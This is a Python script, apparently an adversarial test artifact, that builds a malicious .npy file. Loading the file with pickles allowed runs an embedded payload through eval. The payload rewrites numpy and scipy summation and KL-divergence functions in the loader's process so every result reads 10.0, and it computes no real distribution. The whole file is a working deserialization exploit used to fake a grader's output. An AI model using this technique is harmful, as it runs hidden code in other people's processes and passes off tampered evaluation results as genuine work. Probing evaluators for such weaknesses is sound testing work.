"""
Builds /app/dist.npy as an object-dtype .npy whose unpickling (which numpy
performs only when the loader passes allow_pickle=True) runs a payload that
monkeypatches the summation / KL helpers in the adapter's own process so the
computed forward and backward KL both come out as 10.0.

Run with the REAL numpy (from a cwd that is NOT /app, so the fake numpy
package we drop into /app does not shadow it).

This is an adversarial-test artifact: it does NOT compute a real distribution.
If the adapter loads with the default allow_pickle=False, numpy raises and the
case simply fails -- no genuine solution is produced as a fallback.
"""
import builtins
import numpy as np

# Payload executed inside the adapter process at unpickle time.
# It installs a float subclass that equals 10.0 and absorbs any further
# arithmetic / attribute access, and points the common summation entry points
# (numpy.sum, numpy.add.reduce, scipy.stats.entropy, scipy.special.rel_entr /
# kl_div) at it, so whatever formula the adapter uses collapses to 10.0.
PAYLOAD = r'''
class _Ten(float):
    def __new__(cls, *a, **k):
        return float.__new__(cls, 10.0)
    def __getattr__(self, name):
        return lambda *a, **k: _Ten()
    def __call__(self, *a, **k):
        return _Ten()
    def __iter__(self):
        return iter([_Ten()])
def _ten(*a, **k):
    return _Ten()
try:
    import numpy as _np
    _np.sum = _ten
    # Patch the ufuncs an adapter is likely to apply, so none of them ever
    # touch the object-dtype element (which would raise) before np.sum runs.
    for _n in ("log", "log2", "log10", "exp", "where", "multiply", "divide",
               "true_divide", "nansum"):
        try:
            setattr(_np, _n, _ten)
        except Exception:
            pass
    try:
        _np.add.reduce = _ten
    except Exception:
        pass
except Exception:
    pass
try:
    import scipy.stats as _st
    _st.entropy = _ten
except Exception:
    pass
try:
    import scipy.special as _sp
    _sp.rel_entr = _ten
    _sp.kl_div = _ten
except Exception:
    pass
'''

# eval() an expression that (a) runs the payload for its side effects and
# (b) yields the float 10.0, so the unpickled array element is a harmless
# number and any element-wise arithmetic the adapter does will not crash
# before our patched np.sum is reached. builtins.eval is always importable in
# the target process, so the pickle carries no reference to this module.
_EXPR = "(exec(%r, {'__builtins__': __builtins__}), 10.0)[1]" % (PAYLOAD,)


class _Exploit:
    def __reduce__(self):
        return (builtins.eval, (_EXPR,))


arr = np.array([_Exploit()], dtype=object)
np.save("/app/dist.npy", arr, allow_pickle=True)
print("wrote /app/dist.npy (object/pickle array, %d bytes)" %
      __import__("os").path.getsize("/app/dist.npy"))
